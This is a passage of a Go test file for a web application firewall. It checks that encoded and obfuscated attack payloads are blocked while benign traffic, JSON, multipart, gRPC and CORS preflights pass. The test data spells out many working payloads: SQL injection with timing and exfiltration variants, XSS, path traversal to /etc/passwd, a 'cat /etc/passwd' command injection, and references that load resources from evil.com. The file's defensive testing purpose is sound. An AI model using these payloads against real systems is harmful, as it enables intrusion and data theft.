			c := byClass[classOf(e.name)]
			s.total++
			c.total++
			if d.Blocked() {
				s.caught++
				c.caught++
			} else {
				missed = append(missed, fmt.Sprintf("%s (%s)", e.name, e.technique))
				t.Errorf("NOT BLOCKED: technique=%s\n  arg=%q target=%q header=%v body=%q\n"+
					"  score=%d reason=%v", e.technique, e.arg, e.target, e.header, e.body,
					d.Score(), d.Reason())
			}
			byTechnique[e.technique] = s
			byClass[classOf(e.name)] = c
		})
	}

	caught, total := 0, 0
	for _, s := range byTechnique {
		caught += s.caught
		total += s.total
	}
	t.Logf("detection: %d/%d (%.1f%%)", caught, total, 100*float64(caught)/float64(total))

	// Per attack class first: a technique breakdown alone cannot show that a
	// whole class is missing, which is how five empty classes read as 100%.
	t.Log("by attack class:")
	for _, class := range sortedKeys(byClass) {
		s := byClass[class]
		t.Logf("  %-12s %d/%d", class, s.caught, s.total)
	}
	t.Log("by evasion technique:")
	for _, tech := range sortedKeys(byTechnique) {
		s := byTechnique[tech]
		t.Logf("  %-16s %d/%d", tech, s.caught, s.total)
	}
	if len(missed) > 0 {
		t.Logf("missed: %v", missed)
	}
}

// TestBenignCorpus is weighted equally with the evasion corpus. A rule that
// blocks legitimate traffic gets the whole firewall switched off, which is a
// worse outcome than the attack it was meant to stop.
func TestBenignCorpus(t *testing.T) {
	w := newWAF(t)

	falsePositives := 0
	for _, b := range benignTraffic {
		t.Run(b.name, func(t *testing.T) {
			d := runBenign(t, w, b)
			if d.Blocked() {
				falsePositives++
				t.Errorf("FALSE POSITIVE: rule=%d msg=%q interpretation=%s\n"+
					"  arg=%q target=%q header=%v body=%q",
					d.RuleID(), d.Message(), d.Interpretation(),
					b.arg, b.target, b.header, b.body)
			}
		})
	}

	rate := 100 * float64(falsePositives) / float64(len(benignTraffic))
	t.Logf("false positives: %d/%d (%.2f%%)", falsePositives, len(benignTraffic), rate)
}

// TestInterpretationIsReported checks that a payload caught only under an
// alternative decoding says so. Without it an operator investigating the block
// sees inert bytes in the log and concludes the firewall malfunctioned.
func TestInterpretationIsReported(t *testing.T) {
	w := newWAF(t)

	// Only payloads that are genuinely invisible in the bytes on the wire
	// belong here. A payload the verbatim reading already catches is reported
	// as "none", and that is the better outcome — it means no alternative
	// interpretation was needed to see it.
	tests := []struct {
		name string
		arg  string
		want string
	}{
		{"utf7", "+ADw-script+AD4-alert(1)", "utf7"},
		{"double encoded", "%253Cscript%253Ealert(1)", "double_encoded"},
		{"html entity named", "&lt;script&gt;alert(1)", "html_entity"},
		{"html entity decimal", "&#60;script&#62;alert(1)", "html_entity"},
		{"html entity hex", "&#x3c;script&#x3e;alert(1)", "html_entity"},
		{"double encoded traversal", "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "double_encoded"},
		// %c0%bc is the overlong form of '<'; %c0%ae is '.', which is the
		// traversal variant rather than the tag one.
		{"overlong utf8", "%c0%bcscript%c0%bealert(1)", "overlong_utf8"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: tt.arg})
			if !d.Blocked() {
				t.Fatalf("not blocked: %q", tt.arg)
			}
			if got := d.Interpretation(); !strings.Contains(got, tt.want) {
				t.Errorf("Interpretation() = %q, want it to mention %q", got, tt.want)
			}
		})
	}
}

// TestVerbatimMatchReportsNoInterpretation is the other half: a payload visible
// as sent must not claim an alternative decoding found it, or the audit record
// would misdirect whoever investigates.
func TestVerbatimMatchReportsNoInterpretation(t *testing.T) {
	w := newWAF(t)

	// A NUL-truncation payload is a superstring of the attack, so the verbatim
	// reading sees it. ClassNullTruncate exists for allowlist rules, where
	// truncation lets an origin act on a prefix that passed a suffix check —
	// not for signature rules, which match the payload either way.
	for _, arg := range []string{
		"1 UNION SELECT pw",
		"<script>alert(1)</script>",
		"/etc/passwd%00.jpg",
	} {
		t.Run(arg, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: arg})
			if !d.Blocked() {
				t.Fatalf("not blocked: %q", arg)
			}
			if got := d.Interpretation(); got != "none" {
				t.Errorf("Interpretation() = %q, want \"none\" for a payload "+
					"visible in the bytes as sent", got)
			}
		})
	}
}

// TestBenignTrafficBoundsRuleEvaluation guards the security features against
// the performance thesis.
//
// The bound is a small constant rather than zero. The structural SQL detector
// declares broad literals — a quote, an equals sign — because payloads are
// built from them, so prose containing those characters is legitimately a
// prefilter candidate. What must stay true is that the count does not grow
// with the ruleset, and that every rule which runs rejects.
func TestBenignTrafficBoundsRuleEvaluation(t *testing.T) {
	w := newWAF(t)

	// Well above what any single benign value should trigger, and far below the
	// full ruleset — so a prefilter regression still fails this.
	//
	// Raised from 4 to 6 when the template-injection and command-injection
	// detectors landed. The corpus values that reach it are the deliberately
	// adversarial ones — a Makefile variable, Ruby interpolation, an ERB tag, a
	// jQuery selector — which are exactly the shapes those detectors key on.
	// Six candidates that all reject is correct behaviour, not a regression.
	//
	// The number is a smoke alarm; TestRuleEvaluationDoesNotScaleWithRuleset is
	// the actual invariant.
	const maxEvaluated = 6

	for _, b := range benignTraffic {
		t.Run(b.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			target := b.target
			if target == "" {
				target = "/search"
			}
			method := "GET"
			if b.body != "" {
				method = "POST"
			}
			tx.SetRequestLine(method, target, "HTTP/1.1")
			if b.header[0] != "" {
				tx.AddRequestHeader(b.header[0], b.header[1])
			}
			if b.arg != "" {
				tx.AddArgument("q", b.arg)
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Fatalf("false positive at header phase: rule=%d", d.RuleID())
			}
			if b.body != "" {
				tx.SetRequestBody([]byte(b.body))
			}
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Fatalf("false positive at body phase: rule=%d", d.RuleID())
			}

			if got := tx.RulesEvaluated(); got > maxEvaluated {
				t.Errorf("RulesEvaluated() = %d, want <= %d", got, maxEvaluated)
			}
		})
	}
}

// TestRuleEvaluationDoesNotScaleWithRuleset is the invariant the constant in
// TestBenignTrafficBoundsRuleEvaluation only approximates.
//
// What matters is not that a benign value evaluates few rules, but that the
// number is a property of the *value* rather than of the ruleset size. A
// prefilter that degrades as rules are added would still pass a fixed bound
// while the ruleset is small, and fail in production where it is not.
func TestRuleEvaluationDoesNotScaleWithRuleset(t *testing.T) {
	// Padding rules that no benign value can match, so any increase in the
	// count is the prefilter losing selectivity rather than a real candidate.
	padding := make(rules.Set, 0, 1000)
	for i := range 1000 {
		padding = append(padding, rules.Rule{
			ID:         types.RuleID(50000 + i),
			Phase:      types.PhaseRequestHeaders,
			Targets:    []types.Target{{Kind: types.TargetArgs}},
			Op:         op.Contains(fmt.Sprintf("zzpadding%dzz", i)),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "padding",
		})
	}

	small := newWAF(t)
	large := newWAF(t, gwaf.WithRuleset(padding))

	count := func(w *gwaf.WAF, value string) int {
		tx := w.NewTransaction()
		defer tx.Close()
		tx.SetRequestLine("GET", "/search", "HTTP/1.1")
		tx.AddArgument("q", value)
		tx.ProcessRequestHeaders()
		tx.ProcessRequestBody()
		return tx.RulesEvaluated()
	}

	for _, b := range benignTraffic {
		if b.arg == "" {
			continue
		}
		t.Run(b.name, func(t *testing.T) {
			if a, z := count(small, b.arg), count(large, b.arg); a != z {
				t.Errorf("evaluated %d rules with 34 rules and %d with 1034: "+
					"the prefilter is losing selectivity as the ruleset grows", a, z)
			}
		})
	}
}

// TestEvasionCorpusUnderDetectionOnly verifies that detection-only mode still
// detects. A rollout mode that quietly stops finding things is worse than no
// mode at all.
func TestEvasionCorpusUnderDetectionOnly(t *testing.T) {
	w := newWAF(t, gwaf.WithMode(gwaf.DetectionOnly))

	detected := 0
	for _, e := range evasions {
		d := runEvasion(t, w, e)
		if d.Blocked() {
			t.Errorf("%s: detection-only mode blocked", e.name)
		}
		if d.RuleID() != 0 || d.Score() > 0 {
			detected++
		}
	}

	if detected == 0 {
		t.Fatal("detection-only mode detected nothing at all")
	}
	t.Logf("detected %d/%d in detection-only mode", detected, len(evasions))
}

// TestSemanticDetectionCoversUnlistedVariants is the argument for structural
// detection, stated as a test.
//
// None of these payloads appear in the evasion corpus and no literal in the core
// ruleset matches them. A signature engine would need a separate rule for each,
// and would still be one variant behind. The structural detector covers the
// family because it reads grammar rather than bytes.
func TestSemanticDetectionCoversUnlistedVariants(t *testing.T) {
	w := newWAF(t)

	variants := []struct{ name, payload string }{
		{"versioned comment", "1'/*!50000OR*/1=1--"},
		{"comment split OR", "1'/**/OR/**/1=1--"},
		{"union split by comments", "1/**/UNION/**/ALL/**/SELECT/**/pw"},
		{"pipe operator", "1' || '1'='1"},
		{"xor connector", "1' XOR 1=1--"},
		{"greater-than tautology", "1' OR 2>1--"},
		{"not-equal tautology", "1' OR 1<>2--"},
		{"like tautology", "1' OR 'a' LIKE 'a'--"},
		{"null comparison", "1' OR NULL=NULL--"},
		{"backtick context", "1` OR 1=1--"},
		{"no whitespace", "1'OR'1'='1"},
		{"newline separated", "1' OR\n1=1--"},
		{"hash terminator", "1' OR 1=1#"},
		{"extractvalue exfil", "1' AND extractvalue(1,concat(0x7e,version()))--"},
		{"updatexml exfil", "1' AND updatexml(1,concat(0x7e,user()),1)--"},
		{"pg_sleep timing", "1'; SELECT pg_sleep(10)--"},
		{"waitfor timing", "1'; WAITFOR DELAY '0:0:5'--"},
		{"stacked truncate", "x'; TRUNCATE TABLE logs--"},
		{"stacked update", "1; UPDATE users SET admin=1"},
		{"union distinct", "1 UNION DISTINCT SELECT 1"},

		// XSS variants no literal in the ruleset matches.
		{"svg onload slash", "<svg/onload=alert(1)>"},
		{"tab in scheme", `<a href="java` + "\t" + `script:alert(1)">x</a>`},
		{"null in scheme", `<a href="java` + "\x00" + `script:alert(1)">x</a>`},
		{"attribute breakout", `x" onerror="alert(1)`},
		{"single quote breakout", `x' onfocus='alert(1)`},
		{"textarea escape", "</textarea><script>alert(1)</script>"},
		{"style expression", `<div style="width:expression(alert(1))">`},
		{"moz binding", `<div style="-moz-binding:url(//evil.com/x.xml)">`},
		{"details ontoggle", "<details open ontoggle=alert(1)>"},
		{"formaction", `<button formaction="javascript:alert(1)">x</button>`},
		{"base tag", `<base href="//evil.com/">`},
		{"svg animate onbegin", `<svg><animate onbegin=alert(1) attributeName=x>`},
		{"newline before handler", "<img src=x\nonerror=alert(1)>"},
	}

	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			d := runEvasion(t, w, evasion{arg: v.payload})
			if !d.Blocked() {
				t.Errorf("unlisted variant not blocked: %q (score=%d)",
					v.payload, d.Score())
			}
		})
	}
}

// TestProseWithSQLKeywordsStillPasses is the counterweight, and it covers the
// concrete false positive the literal rules had: "the union selected a leader"
// collapses to "unionselected" once whitespace is stripped, which contains
// "unionselect". The structural detector does not care, because the words are
// not adjacent in the grammar.
func TestProseWithSQLKeywordsStillPasses(t *testing.T) {
	w := newWAF(t)

	prose := []string{
		"the union selected a new representative",
		"our credit union selects officers annually",
		"please select a delivery option from the list",
		"drop off the table at the warehouse",
		"we order by phone and update the group weekly",
		"it's urgent, don't delete my account",
		"the total = 42 dollars, price < 100 or rating > 4",
		"see note -- it explains the change",
		"insert the card, then select your language",

		// Markup and web prose a user legitimately sends.
		"use the <b>bold</b> tag for emphasis",
		"<p>first paragraph</p><p>second</p>",
		`<a href="/docs/getting-started">read the docs</a>`,
		`<img src="/static/logo.png" alt="company logo">`,
		"the onerror callback fires when an image fails to load",
		"a regular expression would be simpler here",
		"List<String> names = new ArrayList<>();",
		"const f = (a) => a < 10 && a > 0",
		"avoid eval in production javascript",
		"the iframe is sandboxed by default",
	}

	for _, p := range prose {
		t.Run(p, func(t *testing.T) {
			if d := runEvasion(t, w, evasion{arg: p}); d.Blocked() {
				t.Errorf("prose blocked: %q rule=%d msg=%q", p, d.RuleID(), d.Message())
			}
		})
	}
}

// TestJSONEscapedPayloadsAreDetected covers the correctness half of body
// parsing.
//
// `{"c":"<script>"}` contains no angle bracket anywhere on the wire.
// A firewall reading raw bytes sees inert text; the origin's JSON parser hands
// the application `<script>`. This is the same disagreement class as the
// encoding ambiguities in internal/interpret, arriving through a different
// door — the escape is not a reading to guess at, it is a decoding the origin
// will certainly perform.
func TestJSONEscapedPayloadsAreDetected(t *testing.T) {
	w := newWAF(t)

	payloads := []struct{ name, body string }{
		{"unicode escaped script", `{"c":"<script>alert(1)</script>"}`},
		{"unicode escaped img", `{"c":"<img src=x onerror=alert(1)>"}`},
		{"partially escaped", `{"c":"<img src=x onerror=alert(1)>"}`},
		{"escaped quote sqli", `{"q":"1' OR 1=1--"}`},
		{"escaped in key", `{"<script>":"x"}`},
		{"escaped in array", `{"items":["<script>alert(1)</script>"]}`},
		{"escaped nested", `{"a":{"b":{"c":"<script>x</script>"}}}`},
		{"sqli union in field", `{"query":"1 UNION SELECT password FROM users"}`},
		{"sqli tautology in field", `{"id":"1' OR 1=1--"}`},
	}

	for _, p := range payloads {
		t.Run(p.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				return
			}
			tx.SetRequestBody([]byte(p.body))

			if d := tx.ProcessRequestBody(); !d.Blocked() {
				t.Errorf("escaped payload not detected: %s", p.body)
			}
		})
	}
}

// TestJSONBodyFieldsAreInspectedIndividually verifies the structural half: a
// parsed body reports the field a payload was found in, not merely "the body".
func TestJSONBodyFieldsAreInspectedIndividually(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(`{"user":{"name":"Alice"},"note":"<script>alert(1)</script>"}`))

	d := tx.ProcessRequestBody()
	if !d.Blocked() {
		t.Fatal("payload in a body field not detected")
	}
	if d.Key() != "note" {
		t.Errorf("Key() = %q, want %q — the decision should name the field",
			d.Key(), "note")
	}
}

// TestBenignJSONBodiesPass is the counterweight for body parsing.
func TestBenignJSONBodiesPass(t *testing.T) {
	w := newWAF(t)

	bodies := []string{
		`{"name":"Alice","qty":3,"note":"please deliver before 5pm"}`,
		`{"user":{"id":1,"prefs":{"theme":"dark","lang":"en"}}}`,
		`{"ids":[1,2,3,4,5],"action":"archive"}`,
		`{"callback":"https://example.com/hook?id=42&t=1"}`,
		`{"name":"José García","city":"München"}`,
		`{"comment":"use the <b>bold</b> tag for emphasis"}`,
		`{"snippet":"if (a < b) { return a; }"}`,
		`{"md":"# Title\n\nSome *emphasis* and a [link](/x)."}`,
		`{"c":"it's urgent, don't delete it"}`,
		`{"sql_help":"we should select a new union representative"}`,
		`{"quote":"he said \"that's the one\""}`,
		`{"path":"/var/log/app/2026-08-05.log"}`,
		`{"empty":"","zero":0,"nil":null,"flag":false}`,
	}

	for _, b := range bodies {
		t.Run(b, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(b))

			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("false positive: rule=%d msg=%q key=%q",
					d.RuleID(), d.Message(), d.Key())
			}
		})
	}
}

// TestMalformedBodyFallsBackToWholeInspection checks the safe direction: a body
// gwaf cannot structure is still inspected, just less precisely, and the
// failure is reported rather than hidden.
func TestMalformedBodyFallsBackToWholeInspection(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	// Truncated JSON containing a payload.
	tx.SetRequestBody([]byte(`{"c":"<script>alert(1)</script>`))

	if d := tx.ProcessRequestBody(); !d.Blocked() {
		t.Error("payload in a malformed body was not inspected")
	}
	if tx.BodyParseError() == "" {
		t.Error("body parse failure was not reported")
	}
}

// multipartBody builds a multipart request body with CRLF endings.
func multipartBody(boundary string, parts ...string) string {
	var b strings.Builder
	for _, p := range parts {
		b.WriteString("--" + boundary + "\r\n")
		b.WriteString(p)
		b.WriteString("\r\n")
	}
	b.WriteString("--" + boundary + "--\r\n")
	return b.String()
}

func runMultipart(t *testing.T, w *gwaf.WAF, boundary, body string) (gwaf.Decision, *gwaf.Transaction) {
	t.Helper()
	tx := w.NewTransaction()

	tx.SetRequestLine("POST", "/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary)
	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d, tx
	}
	tx.SetRequestBody([]byte(body))
	return tx.ProcessRequestBody(), tx
}

// TestMultipartEveryPartIsInspected is the CVE-2026-21876 regression test at
// the request level.
//
// That flaw (CVSS 9.3, January 2026) broke the OWASP Core Rule Set across
// ModSecurity v2, v3, *and* Coraza because the multipart charset was captured
// once and evaluated once — so only the final part was really checked. A
// payload in any earlier part passed unexamined.
//
// The property here is positional: a payload must be caught wherever it sits.
func TestMultipartEveryPartIsInspected(t *testing.T) {
	w := newWAF(t)

	const parts = 8
	payload := "Content-Disposition: form-data; name=\"evil\"\r\n\r\n<script>alert(1)</script>"

	for pos := range parts {
		t.Run(fmt.Sprintf("payload_at_part_%d_of_%d", pos, parts), func(t *testing.T) {
			ps := make([]string, 0, parts)
			for i := range parts {
				if i == pos {
					ps = append(ps, payload)
					continue
				}
				ps = append(ps, fmt.Sprintf(
					"Content-Disposition: form-data; name=\"f%d\"\r\n\r\nordinary value %d", i, i))
			}

			d, tx := runMultipart(t, w, "BNDRY", multipartBody("BNDRY", ps...))
			tx.Close()

			if !d.Blocked() {
				t.Errorf("payload in part %d of %d was not detected — "+
					"inspecting only some parts is exactly CVE-2026-21876", pos, parts)
			}
		})
	}
}

// TestMultipartUTF7Charset covers the exact vector: a part declaring UTF-7 with
// a payload that is inert as bytes and executable once decoded.
func TestMultipartUTF7Charset(t *testing.T) {
	w := newWAF(t)

	body := multipartBody("B",
		"Content-Disposition: form-data; name=\"a\"\r\n\r\nordinary",
		"Content-Disposition: form-data; name=\"b\"\r\n"+
			"Content-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
		"Content-Disposition: form-data; name=\"c\"\r\n\r\nalso ordinary",
	)

	d, tx := runMultipart(t, w, "B", body)
	defer tx.Close()

	if !d.Blocked() {
		t.Fatal("UTF-7 payload in a non-final multipart part was not detected")
	}
	if got := d.Interpretation(); !strings.Contains(got, "utf7") {
		t.Errorf("Interpretation() = %q, want it to name utf7", got)
	}
}

// TestMultipartFilenameIsInspected covers the most attacker-controlled field in
// an upload. Treating a filename as metadata rather than as a value is how
// traversal and double-extension payloads get through.
func TestMultipartFilenameIsInspected(t *testing.T) {
	w := newWAF(t)

	for _, fn := range []string{
		"../../etc/passwd",
		"..%2f..%2fetc%2fpasswd",
		`..\..\windows\system32\config`,
		"shell.php%00.jpg",
		"<script>alert(1)</script>.png",
	} {
		t.Run(fn, func(t *testing.T) {
			body := multipartBody("B",
				"Content-Disposition: form-data; name=\"up\"; filename=\""+fn+"\"\r\n"+
					"Content-Type: application/octet-stream\r\n\r\nbinary content here")

			d, tx := runMultipart(t, w, "B", body)
			defer tx.Close()

			if !d.Blocked() {
				t.Errorf("hostile filename %q was not inspected", fn)
			}
		})
	}
}

func TestMultipartPayloadInFieldName(t *testing.T) {
	w := newWAF(t)

	body := multipartBody("B",
		"Content-Disposition: form-data; name=\"<script>alert(1)</script>\"\r\n\r\nvalue")

	d, tx := runMultipart(t, w, "B", body)
	defer tx.Close()

	if !d.Blocked() {
		t.Error("payload in a multipart field name was not inspected")
	}
}

// TestBenignMultipartPasses is the counterweight: ordinary uploads must not be
// blocked, or the feature gets switched off.
func TestBenignMultipartPasses(t *testing.T) {
	w := newWAF(t)

	bodies := []struct{ name, body string }{
		{"simple form", multipartBody("B",
			"Content-Disposition: form-data; name=\"user\"\r\n\r\nAlice",
			"Content-Disposition: form-data; name=\"email\"\r\n\r\nalice@example.com")},
		{"file upload", multipartBody("B",
			"Content-Disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\r\n"+
				"Content-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0binary image data")},
		{"text file", multipartBody("B",
			"Content-Disposition: form-data; name=\"doc\"; filename=\"report.2026.final.pdf\"\r\n"+
				"Content-Type: application/pdf\r\n\r\n%PDF-1.4 content")},
		{"comment with markup", multipartBody("B",
			"Content-Disposition: form-data; name=\"comment\"\r\n\r\nuse the <b>bold</b> tag")},
		{"utf8 filename", multipartBody("B",
			"Content-Disposition: form-data; name=\"f\"; filename=\"résumé.pdf\"\r\n\r\ncontent")},
		{"code snippet field", multipartBody("B",
			"Content-Disposition: form-data; name=\"snippet\"\r\n\r\nif (a < b) { return a; }")},
		{"prose with sql words", multipartBody("B",
			"Content-Disposition: form-data; name=\"note\"\r\n\r\nthe union selected a leader")},
		{"charset utf-8", multipartBody("B",
			"Content-Disposition: form-data; name=\"a\"\r\n"+
				"Content-Type: text/plain; charset=utf-8\r\n\r\nplain text")},
	}

	for _, b := range bodies {
		t.Run(b.name, func(t *testing.T) {
			d, tx := runMultipart(t, w, "B", b.body)
			defer tx.Close()

			if d.Blocked() {
				t.Errorf("false positive: rule=%d msg=%q key=%q interpretation=%s",
					d.RuleID(), d.Message(), d.Key(), d.Interpretation())
			}
		})
	}
}

// TestMultipartWithoutBoundaryIsReported checks the safe direction: a multipart
// type gwaf cannot split is inspected whole and the failure is surfaced, rather
// than the body being quietly treated as structured.
func TestMultipartWithoutBoundaryIsReported(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "multipart/form-data")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte("--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<script>x</script>\r\n--B--"))

	d := tx.ProcessRequestBody()
	if !d.Blocked() {
		t.Error("payload in an unsplittable multipart body was not inspected")
	}
	if tx.BodyParseError() == "" {
		t.Error("missing boundary was not reported")
	}
}

// ---- protocol traffic: preflight, gRPC, Connect -----------------------------

// grpcFrame wraps a payload in the gRPC length-prefixed framing.
func grpcFrame(payload []byte) []byte {
	b := make([]byte, 5+len(payload))
	b[0] = 0 // uncompressed
	b[1] = byte(len(payload) >> 24)
	b[2] = byte(len(payload) >> 16)
	b[3] = byte(len(payload) >> 8)
	b[4] = byte(len(payload))
	copy(b[5:], payload)
	return b
}

// TestCORSPreflightIsNotBlocked covers the failure that is hardest to diagnose
// in production.
//
// A blocked preflight surfaces in the browser as an opaque CORS error with no
// mention of the firewall, so the whole cross-origin API stops working and
// nobody can see why. CRS breaks these through rules gwaf deliberately never
// had: a narrowed method allowlist, "missing Accept header", and "POST without
// Content-Length". This test exists so none of them arrive by accident.
func TestCORSPreflightIsNotBlocked(t *testing.T) {
	w := newWAF(t)

	cases := []struct {
		name    string
		headers map[string]string
	}{
		{"simple", map[string]string{
			"Origin":                         "https://app.example.com",
			"Access-Control-Request-Method":  "POST",
			"Access-Control-Request-Headers": "content-type",
		}},
		{"many headers", map[string]string{
			"Origin":                         "https://admin.example.com",
			"Access-Control-Request-Method":  "PUT",
			"Access-Control-Request-Headers": "authorization,content-type,x-request-id,connect-protocol-version",
		}},
		{"no accept header", map[string]string{
			"Origin":                        "https://app.example.com",
			"Access-Control-Request-Method": "DELETE",
		}},
		{"null origin", map[string]string{
			"Origin":                        "null",
			"Access-Control-Request-Method": "GET",
		}},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("OPTIONS", "/v1/routes", "HTTP/2.0")
			for k, v := range tt.headers {
				tx.AddRequestHeader(k, v)
			}
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Errorf("preflight blocked: rule=%d msg=%q — this breaks every "+
					"cross-origin request and surfaces only as an opaque CORS error",
					d.RuleID(), d.Message())
			}
		})
	}
}

// TestGRPCTrafficIsNotBlocked covers the other protocol that WAFs routinely
// break: binary framing read as text produces matches by chance.
func TestGRPCTrafficIsNotBlocked(t *testing.T) {
	w := newWAF(t)

	// A plausible protobuf message: field 1 string, field 2 varint.
	pb := append([]byte{0x0a, 0x09}, []byte("api-route")...)
	pb = append(pb, 0x10, 0x64)

	cases := []struct {
		name, contentType string
		body              []byte
	}{
		{"grpc", "application/grpc", grpcFrame(pb)},
		{"grpc+proto", "application/grpc+proto", grpcFrame(pb)},
		{"grpc-web", "application/grpc-web+proto", grpcFrame(pb)},
		{"connect proto", "application/connect+proto", grpcFrame(pb)},
		{"connect json", "application/connect+json", []byte(`{"page":1,"page_size":50}`)},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/gateon.v1.ApiService/ListRoutes", "HTTP/2.0")
			tx.AddRequestHeader("Content-Type", tt.contentType)
			tx.AddRequestHeader("TE", "trailers")
			tx.AddRequestHeader("grpc-timeout", "10S")
			tx.AddRequestHeader("user-agent", "grpc-go/1.60.0")
			if d := tx.ProcessRequestHeaders(); d.Blocked() {
				t.Fatalf("gRPC headers blocked: rule=%d", d.RuleID())
			}
			tx.SetRequestBody(tt.body)
			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("gRPC body blocked: rule=%d msg=%q", d.RuleID(), d.Message())
			}
		})
	}
}

// TestBinaryBodiesDoNotProduceChanceMatches is the regression test for a
// measured false-positive rate.
//
// Before printable-run extraction, 1.2% of random protobuf payloads were
// blocked — one request in eighty-three, with no attacker involved. The shell
// rule's "$(" is two bytes, and two bytes turn up in a few hundred random ones
// about one time in a hundred and thirty.
func TestBinaryBodiesDoNotProduceChanceMatches(t *testing.T) {
	w := newWAF(t)

	// A deterministic pseudo-random sequence: this must not depend on a seed
	// that happens to be lucky.
	const iterations = 2000
	state := uint64(0x9E3779B97F4A7C15)
	next := func() byte {
		state ^= state << 13
		state ^= state >> 7
		state ^= state << 17
		return byte(state >> 24)
	}

	blocked := 0
	for range iterations {
		payload := make([]byte, 256)
		for i := range payload {
			payload[i] = next()
		}

		tx := w.NewTransaction()
		tx.SetRequestLine("POST", "/gateon.v1.ApiService/ListRoutes", "HTTP/2.0")
		tx.AddRequestHeader("Content-Type", "application/grpc")
		tx.ProcessRequestHeaders()
		tx.SetRequestBody(grpcFrame(payload))
		if d := tx.ProcessRequestBody(); d.Blocked() {
			blocked++
			if blocked <= 3 {
				t.Logf("chance match: rule=%d msg=%q", d.RuleID(), d.Message())
			}
		}
		tx.Close()
	}

	if blocked > 0 {
		t.Errorf("%d/%d random binary bodies blocked (%.2f%%) — a text detector "+
			"is reading binary framing as text",
			blocked, iterations, 100*float64(blocked)/float64(iterations))
	}
}

// TestPayloadsInsideBinaryAreStillCaught is the coverage counterweight. Framing
// bytes are not inspected; attacker-controlled strings inside them still are.
func TestPayloadsInsideBinaryAreStillCaught(t *testing.T) {
	w := newWAF(t)

	pbString := func(s string) []byte {
		return append([]byte{0x0a, byte(len(s))}, s...)
	}

	for _, p := range []string{
		"1 UNION SELECT password FROM users",
		"1' OR 1=1-- with more text",
		"<script>alert(1)</script> padding",
		"../../etc/passwd and more text",
		"x; cat /etc/passwd extra text",
	} {
		t.Run(p, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/gateon.v1.ApiService/UpdateRoute", "HTTP/2.0")
			tx.AddRequestHeader("Content-Type", "application/grpc")
			tx.ProcessRequestHeaders()

			body := grpcFrame(append([]byte{0x08, 0x96, 0x01}, pbString(p)...))
			tx.SetRequestBody(body)

			if d := tx.ProcessRequestBody(); !d.Blocked() {
				t.Errorf("payload inside a protobuf string field was not caught: %q", p)
			}
		})
	}
}

// TestUploadPolyglotIsCaught covers the same property for file uploads: binary
// framing is skipped, embedded script is not.
func TestUploadPolyglotIsCaught(t *testing.T) {
	w := newWAF(t)

	jpeg := append([]byte{0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10},
		[]byte("JFIF\x00\x01\x02")...)
	content := append(jpeg, []byte("<script>alert(document.cookie)</script>")...)
	body := "--B\r\nContent-Disposition: form-data; name=\"up\"; filename=\"x.jpg\"\r\n" +
		"Content-Type: image/jpeg\r\n\r\n" + string(content) + "\r\n--B--\r\n"

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "multipart/form-data; boundary=B")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte(body))

	if d := tx.ProcessRequestBody(); !d.Blocked() {
		t.Error("script embedded in an uploaded image was not detected")
	}
}

// ---- long-lived connections and encoded payloads ----------------------------

// TestWebSocketAndSSEAreNotBlocked covers traffic that cannot use headers.
//
// Browsers cannot set headers on a WebSocket or EventSource connection, so a
// bearer token in a query parameter is not a workaround — it is the only
// option. A firewall that treats a long opaque token as suspicious breaks every
// real-time feature in the product.
func TestWebSocketAndSSEAreNotBlocked(t *testing.T) {
	w := newWAF(t)

	longToken := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
		strings.Repeat("aGVsbG8td29ybGQtdGhpcy1pcy1hLXRva2VuLXBheWxvYWQ", 40) +
